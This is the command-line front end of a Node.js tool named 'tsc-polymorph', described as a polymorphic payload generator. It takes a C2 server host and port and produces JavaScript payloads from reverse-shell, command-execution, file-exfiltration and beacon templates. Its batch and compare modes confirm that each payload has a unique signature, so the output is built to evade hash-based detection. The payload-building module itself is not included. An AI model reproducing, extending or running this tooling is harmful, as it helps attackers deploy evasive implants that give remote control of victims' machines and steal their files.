#!/usr/bin/env node

const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const minimist = require('minimist');
const Generator = require('../src/generator');

function showHelp() {
  console.log(`
tsc-polymorph v1.0.0 — Polymorphic Payload Generator

USAGE:
  tsc-polymorph generate [options]
  tsc-polymorph info <file>
  tsc-polymorph compare <file1> <file2>
  tsc-polymorph batch [options]
  tsc-polymorph help

OPTIONS (generate):
  --host <ip>            C2 server hostname or IP (required)
  --port <num>           C2 server port (default: 4443)
  --protocol <tcp|https> Communication protocol (default: tcp)
  --beacon <sec>         Beacon interval in seconds (default: 60)
  --template <type>      Payload template: reverse-shell, command-exec,
                         file-exfil, beacon (default: auto)
  --command <str>        Command to execute (for command-exec template)
  --file <path>          File to exfiltrate (for file-exfil template)
  --output <file>        Output file path (default: payload.js)

OPTIONS (batch):
  --count <num>          Number of payloads to generate (default: 10)
  --host <ip>            C2 server hostname or IP (required)
  --port <num>           C2 server port (default: 4443)
  --protocol <tcp|https> Communication protocol (default: tcp)
  --beacon <sec>         Beacon interval (default: 60)
  --template <type>      Payload template
  --output-dir <dir>     Output directory (default: ./payloads/)
`);
}

function cmdGenerate(args) {
  const host = args.host;
  if (!host) {
    console.error('[-] --host is required');
    process.exit(1);
  }

  const config = {
    host,
    port: args.port || 4443,
    protocol: args.protocol || 'tcp',
    beacon: args.beacon || 60,
    template: args.template || 'auto',
    command: args.command,
    file: args.file
  };

  const output = args.output || 'payload.js';

  const generator = new Generator();
  const code = generator.generate(config);

  fs.writeFileSync(output, code, 'utf8');
  console.log(`[+] Generated polymorphic payload -> ${output}`);
}

function cmdInfo(args) {
  const filePath = args._[0];
  if (!filePath) {
    console.error('[-] Usage: tsc-polymorph info <file>');
    process.exit(1);
  }

  if (!fs.existsSync(filePath)) {
    console.error(`[-] File not found: ${filePath}`);
    process.exit(1);
  }

  const content = fs.readFileSync(filePath, 'utf8');
  const lines = content.split('\n');

  const meta = {};
  let bodyStart = -1;

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    if (line.startsWith('// ====PAYLOAD====')) {
      bodyStart = i;
      break;
    }
    if (line.startsWith('// tsc-polymorph:')) {
      const rest = line.replace('// tsc-polymorph:', '').trim();
      const eqIdx = rest.indexOf('=');
      if (eqIdx !== -1) {
        const key = rest.substring(0, eqIdx).trim();
        const val = rest.substring(eqIdx + 1).trim();
        meta[key] = val;
      } else {
        meta._version = rest;
      }
    }
  }

  if (bodyStart === -1) {
    console.error('[-] Not a valid tsc-polymorph payload');
    process.exit(1);
  }

  const bodyContent = lines.slice(bodyStart + 1).join('\n');
  const computedHash = crypto.createHash('sha256').update(bodyContent, 'utf8').digest('hex');
  const storedHash = meta.hash ? meta.hash.replace('sha256:', '') : null;
  const integrity = storedHash === computedHash ? 'OK (hash matches)' : 'FAILED (hash mismatch)';

  console.log(`[+] File: ${filePath}`);
  console.log(`[+] Generator: tsc-polymorph ${meta._version || '?'}`);
  console.log(`[+] Target: ${meta.host || '?'}:${meta.port || '?'} (${meta.protocol || '?'})`);
  console.log(`[+] Template: ${meta.template || '?'}`);
  console.log(`[+] Beacon: ${meta.beacon || '?'}s`);
  console.log(`[+] Generated: ${meta.timestamp || '?'}`);
  console.log(`[+] SHA256: ${computedHash}`);
  console.log(`[+] Integrity: ${integrity}`);
}

function cmdCompare(args) {
  const file1 = args._[0];
  const file2 = args._[1];

  if (!file1 || !file2) {
    console.error('[-] Usage: tsc-polymorph compare <file1> <file2>');
    process.exit(1);
  }

  if (!fs.existsSync(file1)) {
    console.error(`[-] File not found: ${file1}`);
    process.exit(1);
  }
  if (!fs.existsSync(file2)) {
    console.error(`[-] File not found: ${file2}`);
    process.exit(1);
  }

  const c1 = fs.readFileSync(file1, 'utf8');
  const c2 = fs.readFileSync(file2, 'utf8');

  const h1 = crypto.createHash('sha256').update(c1, 'utf8').digest('hex');
  const h2 = crypto.createHash('sha256').update(c2, 'utf8').digest('hex');

  const size1 = Buffer.byteLength(c1, 'utf8');
  const size2 = Buffer.byteLength(c2, 'utf8');

  console.log(`[+] File 1: ${file1} (${size1} bytes)`);
  console.log(`[+] SHA256: ${h1}`);
  console.log('');
  console.log(`[+] File 2: ${file2} (${size2} bytes)`);
  console.log(`[+] SHA256: ${h2}`);
  console.log('');

  if (h1 === h2) {
    console.log('[!] Result: IDENTICAL (unexpected for polymorphic generator)');
  } else {
    console.log('[+] Result: DIFFERENT (polymorphic — unique signature verified)');
  }
}

function cmdBatch(args) {
  const host = args.host;
  if (!host) {
    console.error('[-] --host is required for batch mode');
    process.exit(1);
  }

  const count = args.count || 10;
  const outDir = args['output-dir'] || './payloads/';

  if (!fs.existsSync(outDir)) {
    fs.mkdirSync(outDir, { recursive: true });
  }

  const config = {
    host,
    port: args.port || 4443,
    protocol: args.protocol || 'tcp',
    beacon: args.beacon || 60,
    template: args.template || 'auto',
    command: args.command,
    file: args.file
  };

  const generator = new Generator();
  const hashes = new Set();

  console.log(`[+] Generating ${count} polymorphic payloads...\n`);

  for (let i = 1; i <= count; i++) {
    const code = generator.generate(config);
    const hash = crypto.createHash('sha256').update(code, 'utf8').digest('hex');
    hashes.add(hash);

    const filename = `payload_${String(i).padStart(String(count).length, '0')}.js`;
    const outPath = path.join(outDir, filename);
    fs.writeFileSync(outPath, code, 'utf8');
    console.log(`  [${i}/${count}] ${filename} — ${hash.substring(0, 16)}...`);
  }

  console.log(`\n[+] Done — ${hashes.size} unique payloads in ${outDir}`);
  if (hashes.size < count) {
    console.log(`[!] Warning: ${count - hashes.size} duplicate(s) detected`);
  }
}

function main() {
  const args = minimist(process.argv.slice(2), {
    string: ['host', 'port', 'protocol', 'beacon', 'template', 'output', 'command', 'file', 'output-dir'],
    alias: {
      h: 'host',
      p: 'port',
      o: 'output',
      c: 'count'
    }
  });

  const cmd = args._[0] || 'help';
  args._.shift();

  switch (cmd) {
    case 'generate':
      cmdGenerate(args);
      break;
    case 'info':
      cmdInfo(args);
      break;
    case 'compare':
      cmdCompare(args);
      break;
    case 'batch':
      cmdBatch(args);
      break;
    case 'help':
    default:
      showHelp();
      break;
  }
}

main();
